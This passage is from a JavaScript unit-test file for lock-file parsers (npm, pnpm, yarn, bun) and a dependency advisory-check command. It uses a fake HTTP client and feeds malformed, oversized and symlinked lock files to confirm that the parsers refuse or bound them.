  assert.equal(registryResolved(`https://h/${'/-/a'.repeat(200000)}`), false);
  assert.equal(registryResolved(`https://h/${'/-/a'.repeat(1000)}`), false);
  assert.equal(registryResolved('https://registry.npmjs.org/@s/x/-/x-1.0.0.tgz#0123abcd'), true);
  const npm = npmPackages(JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/x': { version: '1.0.0', resolved: `https://h/${'/-/a'.repeat(1000000)}` } } }));
  assert.deepEqual(why(ok(npm)), { 'non-registry': 1 });
  // keys and values of the maximum line length, full of the characters the parsers look for
  const at = '@'.repeat(MAX_LINE - 10); const par = '('.repeat(MAX_LINE - 10);
  const pn = ok(pnpmPackages(`lockfileVersion: '9.0'\npackages:\n  /${at}:\n    resolution: {integrity: x}\n  a@1.0.0${par}:\n    resolution: {integrity: x}\n`));
  assert.deepEqual(pk(pn), { a: ['1.0.0'] }, 'the parenthesised peer suffix is cut'); assert.equal(pn.skipped, 1);
  refused(pnpmPackages(`lockfileVersion: '9.0'\npackages:\n  a@1.0.0:\n    resolution: {${'a: b, '.repeat(2000)}}\n`), 'lock_unreadable', /twice in the flow map/);
  ok(yarnPackages(`# yarn lockfile v1\n${`"a@${'npm:'.repeat(3000)}"`}:\n  version "1.0.0"\n  resolved "https://r/a/-/a-1.0.0.tgz"\n`));
  ok(yarnPackages(`__metadata:\n  version: 6\n"x":\n  resolution: "${'@patch:'.repeat(2000)}"\n`));
  assert.equal(yamlScalar(`'${"'".repeat(MAX_LINE - 2)}'`), null);
  // a version and a name at the grammar's limits
  ok(bunPackages(JSON.stringify({ lockfileVersion: 1, packages: { a: [`a@1.0.0-${'a.'.repeat(500)}a`, ''], b: [`${'b'.repeat(1020)}@1.0.0`, ''] } })));
  assert.ok(Date.now() - t0 < 10000, `took ${Date.now() - t0} ms`);
  // a lock of 200000 entries is read in bounded time and then refused by the request bounds (5000 packages), not here
  const big = ['lockfileVersion: \'9.0\'', 'packages:'];
  for (let i = 0; i < 200000; i++) big.push(`  p${i}@1.0.0:`, '    resolution: {integrity: sha512-a}');
  const t1 = Date.now();
  assert.equal(ok(pnpmPackages(big.join('\n'))).packages.size, 200000);
  assert.ok(Date.now() - t1 < 10000, `took ${Date.now() - t1} ms`);
});

test('every parser fails closed on bytes that are no lock at all', () => {
  const junk = ['', '\u0000', '﻿', '{', '}{', '---\n', '\n\n\n', 'packages:', Buffer.from([0xff, 0xfe, 0x00, 0x41]).toString('latin1'), '‮@1.0.0', 'a'.repeat(MAX_LINE + 1)];
  for (const [name, parse] of Object.entries(LOCK_FORMATS)) {
    for (const j of junk) {
      const r = /** @type {any} */ (parse(j));
      assert.ok('error' in r || (r.packages.size === 0), `${name} ${JSON.stringify(j.slice(0, 20))}`);
    }
  }
  clean();
  assert.deepEqual(Object.keys(LOCK_FORMATS).sort(), ['bun-jsonc', 'npm-json', 'pnpm-yaml', 'yarn']);
  assert.equal(Object.getPrototypeOf(LOCK_FORMATS), null);
  assert.equal(LOCK_FORMATS['__proto__'], undefined); assert.equal(LOCK_FORMATS['constructor'], undefined);
});

// ---- the command end to end, with a fake io.http (no network)

const REC = '.agents/runs/LC/ADVISORY_CHECK.json';
const ADV = [{ id: 1, url: 'https://github.com/advisories/GHSA-35jh-r3h4-6jhm', title: 'Command Injection', severity: 'high', vulnerable_versions: '<4.17.21' }];
/** @typedef {import('../../control-plane/agents/scripts/core/advisory.mjs').HttpRequest} Req */
/** @param {unknown} [answer] @returns {((r: Req) => any) & { calls: Req[] }} */
function fake(answer = { status: 200, body: JSON.stringify({ lodash: ADV }) }) {
  /** @type {Req[]} */ const calls = [];
  return Object.assign((/** @type {Req} */ r) => { calls.push(r); return answer; }, { calls });
}
/** A frozen, implemented run whose diff touches `first` (package.json by default); no lock at the root. @param {string} [first] */
function run(first = 'package.json') {
  const d = rrun('COMPLEX', `${first} src/a.js`);
  sedFile(d, '.agents/config.yaml', /^ {2}advisory_check:.*$/, '  advisory_check: on');
  frozen(d);
  implement(d, first, '{ "name": "x" }');
  return d;
}
/** @param {string} d @param {(r: Req) => any} http */
function check(d, http) {
  /** @type {Buffer[]} */ const out = [];
  const before = process.cwd();
  try {
    process.chdir(d);
    coreRun(['advisory-check', 'LC'], { env: /** @type {NodeJS.ProcessEnv} */ (cleanEnv({})), cwd: d, stdout: { write: (b) => out.push(b) }, stderr: { write: (b) => out.push(b) }, scriptPath: path.join(d, '.agents/scripts/agent.sh'), http });
  } finally { process.chdir(before); }
  return Buffer.concat(out).toString('utf8');
}
/** @param {string} d */
const record = (d) => JSON.parse(readFileSync(path.join(d, REC), 'utf8'));
/** @param {string} d */
const rows = (d) => readFileSync(path.join(d, '.agents/runs/LC/LEDGER.log'), 'utf8').split('\n').filter((l) => / event=advisory-check /.test(l));

const YARN = '# yarn lockfile v1\n\nlodash@^4.17.20:\n  version "4.17.20"\n  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.20.tgz#abc"\n\n"@s/x@^1":\n  version "1.0.0"\n  resolved "https://registry.yarnpkg.com/@s/x/-/x-1.0.0.tgz"\n';
const PNPM = "lockfileVersion: '9.0'\n\npackages:\n\n  lodash@4.17.20:\n    resolution: {integrity: sha512-a}\n\n  '@s/x@1.0.0':\n    resolution: {integrity: sha512-b}\n";
const BUNL = '{\n  "lockfileVersion": 1,\n  "packages": {\n    "lodash": ["lodash@4.17.20", "", {}, "sha512-a"],\n    "@s/x": ["@s/x@1.0.0", "", {}, "sha512-b"],\n  },\n}\n';

test('advisory-check reads a pnpm, a yarn and a bun lock: the same bounded POST of names and versions, the record names the lock and its format, the ledger row seals it', () => {
  for (const [file, text, format] of [['pnpm-lock.yaml', PNPM, 'pnpm-yaml'], ['yarn.lock', YARN, 'yarn'], ['bun.lock', BUNL, 'bun-jsonc']]) {
    const d = run();
    wr(d, file, text);
    const http = fake();
    const out = check(d, http);
    assert.match(out, /^advisory-check: measured by POST https:\/\/registry\.npmjs\.org\/-\/npm\/v1\/security\/advisories\/bulk: 1 advisories/, `${file}: ${out}`);
    assert.equal(http.calls.length, 1, file);
    assert.deepEqual(JSON.parse(http.calls[0].body), { '@s/x': ['1.0.0'], lodash: ['4.17.20'] }, file);
    const rec = record(d);
    assert.equal(rec.status, 'measured'); assert.equal(rec.lock, file); assert.equal(rec.format, format);
    assert.equal(rec.lock_sha256, createHash('sha256').update(text).digest('hex'));
    assert.match(rec.sent, new RegExp(`^the package names and versions of ${file.replace('.', '\\.')} \\(2 packages, 2 versions\\)`));
    const sha = createHash('sha256').update(readFileSync(path.join(d, REC))).digest('hex');
    assert.deepEqual(rows(d).map((l) => / detail=(.*)$/.exec(l)?.[1]), [`record=${sha} lock=${rec.lock_sha256} status=measured`]);
    // once per lock content: the same lock is not asked about again
    assert.match(check(d, http), /already recorded for this lock file: no second request/);
    assert.equal(http.calls.length, 1);
    // the dependencies validator accepts the record for this lock name (it is one of advisory.locks of the skill's copy of ecosystems.json)
    const ledger = rows(d)[0];
    const doc = { changes: [{ kind: 'changed', name: 'lodash' }] };
    const res = /** @type {any} */ (applyAdvisory(doc, rec, { lockSha: rec.lock_sha256, recordSha: sha, ledgerText: ledger }));
    assert.deepEqual(res.errors, [], file);
    assert.deepEqual(res.doc.vulnerabilities.map((/** @type {any} */ v) => [v.id, v.package, v.severity]), [['GHSA-35jh-r3h4-6jhm', 'lodash', 'high']]);
  }
});

test('a changed pnpm, yarn or bun lock alone makes the check run (watch), and a lock the parser refuses is not_run with no request', () => {
  const d = run('yarn.lock');
  wr(d, 'yarn.lock', YARN.replace('  version "4.17.20"', '   version "4.17.20"'));
  const http = fake();
  assert.match(check(d, http), /^advisory-check: not_run: the lock file is not a yarn lock this parser reads \(line 4: an odd indentation\)/);
  assert.equal(record(d).reason_kind, 'lock_unreadable');
  wr(d, 'yarn.lock', YARN);
  assert.match(check(d, http), /^advisory-check: measured/);
  assert.equal(http.calls.length, 1);
});

test('the binary bun.lockb is refused unparsed, more than one root lock is refused, a linked lock is not read: no request in any case', () => {
  const http = fake();
  let d = run();
  writeFileSync(path.join(d, 'bun.lockb'), Buffer.from([0x23, 0x21, 0x2f, 0x75, 0x73, 0x72, 0x00, 0xff]));
  assert.match(check(d, http), /^advisory-check: not_run: bun\.lockb is a binary lock file, which is not parsed \(only text lock files are read as data\)/);
  assert.equal(record(d).reason_kind, 'lock_unsupported');
  wr(d, 'bun.lock', BUNL);
  assert.match(check(d, http), /^advisory-check: not_run: more than one lock file at the project root \(bun\.lock, bun\.lockb\): which one the package manager uses is not guessed/);
  d = run();
  wr(d, 'package-lock.json', JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/lodash': { version: '4.17.20' } } }));
  wr(d, 'yarn.lock', YARN);
  assert.match(check(d, http), /not_run: more than one lock file at the project root \(package-lock\.json, yarn\.lock\)/);
  assert.equal(record(d).reason_kind, 'several_locks');
  d = run();
  wr(d, 'elsewhere.yaml', PNPM); symlinkSync(path.join(d, 'elsewhere.yaml'), path.join(d, 'pnpm-lock.yaml'));
  assert.match(check(d, http), /not_run: pnpm-lock\.yaml is not a regular file \(a link is never followed\): the lock is not read/);
  assert.equal(record(d).reason_kind, 'lock_unreadable');
  assert.equal(http.calls.length, 0);
});

test('the npm pair keeps the A373 precedence: npm-shrinkwrap.json beside package-lock.json is read (npm installs from it); a link in the pair makes it several_locks', () => {
  const http = fake();
  let d = run();
  wr(d, 'npm-shrinkwrap.json', JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/lodash': { version: '4.17.20' } } }));
  wr(d, 'package-lock.json', JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/other': { version: '1.0.0' } } }));
  assert.match(check(d, http), /^advisory-check: measured/);
  assert.equal(record(d).lock, 'npm-shrinkwrap.json');
  assert.deepEqual(JSON.parse(http.calls[0].body), { lodash: ['4.17.20'] });
  d = run();
  wr(d, 'npm-shrinkwrap.json', JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/lodash': { version: '4.17.20' } } }));
  wr(d, '.y/real.json', '{}'); symlinkSync(path.join(d, '.y/real.json'), path.join(d, 'package-lock.json'));
  assert.match(check(d, http), /not_run: more than one lock file at the project root \(npm-shrinkwrap\.json, package-lock\.json\)/);
  d = run();
  wr(d, 'npm-shrinkwrap.json', JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/lodash': { version: '4.17.20' } } }));
  wr(d, 'package-lock.json', '{}'); wr(d, 'yarn.lock', YARN);
  assert.match(check(d, http), /not_run: more than one lock file at the project root \(npm-shrinkwrap\.json, package-lock\.json, yarn\.lock\)/);
  assert.equal(http.calls.length, 1);
});

test('a linked lock beside a regular one is a second lock: not_run several_locks, neither is read (security review of PR 362)', () => {
  // RED before the fix: the link was dropped from the choice, the benign package-lock.json alone was read and the record said measured with nothing asked
  const http = fake();
  for (const [link, target] of [['yarn.lock', YARN], ['bun.lockb', 'binary'], ['pnpm-lock.yaml', PNPM]]) {
    const d = run();
    wr(d, 'package-lock.json', JSON.stringify({ lockfileVersion: 3, packages: { '': { name: 'x' } } }));
    wr(d, '.y/real.lock', target); symlinkSync(path.join(d, '.y/real.lock'), path.join(d, link));
    assert.match(check(d, http), new RegExp(`^advisory-check: not_run: more than one lock file at the project root \\((?=.*package-lock\\.json)(?=.*${link.replace('.', '\\.')})`), link);
    assert.equal(record(d).reason_kind, 'several_locks');
  }
  // a dangling link counts too
  const d = run();
  wr(d, 'yarn.lock', YARN); symlinkSync(path.join(d, 'nowhere'), path.join(d, 'bun.lock'));
  assert.match(check(d, http), /not_run: more than one lock file at the project root \(bun\.lock, yarn\.lock\)|not_run: more than one lock file at the project root \(yarn\.lock, bun\.lock\)/);
  assert.equal(http.calls.length, 0);
});

test('nothing to ask is never measured: an empty lock, or one whose every entry is skipped, is not_run with no request (security review of PR 362)', () => {
  const http = fake();
  let d = run();
  wr(d, 'package-lock.json', JSON.stringify({ lockfileVersion: 3, packages: { '': { name: 'x' } } }));
  assert.match(check(d, http), /^advisory-check: not_run: package-lock\.json lists no package entry: nothing was asked/);
  assert.equal(record(d).status, 'not_run'); assert.equal(record(d).reason_kind, 'no_packages');
  d = run();
  wr(d, 'bun.lock', '{"lockfileVersion": 1, "packages": {"g": ["g@github:o/r#a", {}], "f": ["f@file:x", {}]}}');
  assert.match(check(d, http), /^advisory-check: not_run: none of the 2 entries of bun\.lock could be checked \(non-registry 2\): nothing was asked/);
  assert.equal(rows(d).length, 1); assert.match(rows(d)[0], / status=not_run$/);
  assert.equal(http.calls.length, 0);
});

test('pnpm: `packages:` with anything after the colon, or a block header without entries, refuses the lock instead of reading it as empty (security review of PR 362)', () => {
  // RED before the fix: each of these read as a measured lock of 0 packages
  const entry = '\n\n  lodash@4.17.20:\n    resolution: {integrity: sha512-a}\n';
  for (const suf of [' # c', ' &a', ' !!map', ' !!omap', ' *a', ' {lodash@4.17.20: {resolution: {integrity: sha512-a}}}', ' {}x', ' []', ' null', ' ~']) {
    refused(pnpmPackages(`lockfileVersion: '9.0'\n\npackages:${suf}${entry}`), 'lock_unreadable', /`packages:` followed by something other than|strict subset/);
  }
  refused(pnpmPackages("lockfileVersion: '9.0'\npackages: {lodash@4.17.20: {resolution: {integrity: sha512-a}}}\n"), 'lock_unreadable');
  refused(pnpmPackages("lockfileVersion: '9.0'\npackages:# c\n"), 'lock_unreadable', /strict subset/);
  refused(pnpmPackages("lockfileVersion: '9.0'\npackages:\n\nsnapshots:\n  lodash@4.17.20: {}\n"), 'lock_unreadable', /without entries/);
  refused(pnpmPackages("lockfileVersion: '9.0'\npackages:\n"), 'lock_unreadable', /without entries/);
  refused(pnpmPackages(`---\nlockfileVersion: '9.0'\npackages:${entry}---\nlockfileVersion: '9.0'\npackages:\n`), 'lock_unreadable', /without entries/);
  assert.equal(ok(pnpmPackages("lockfileVersion: '9.0'\npackages: {}\nsnapshots: {}\n")).total, 0, '`packages: {}` is the empty lock pnpm writes');
  // end to end: the flow form is not_run, never measured
  const d = run(); const http = fake();
  wr(d, 'pnpm-lock.yaml', "lockfileVersion: '9.0'\npackages: {lodash@4.17.20: {resolution: {integrity: sha512-a}}}\n");
  assert.match(check(d, http), /^advisory-check: not_run: the lock file is not a pnpm lock this parser reads \(line 2: `packages:` followed by something other than/);
  assert.equal(http.calls.length, 0);
});
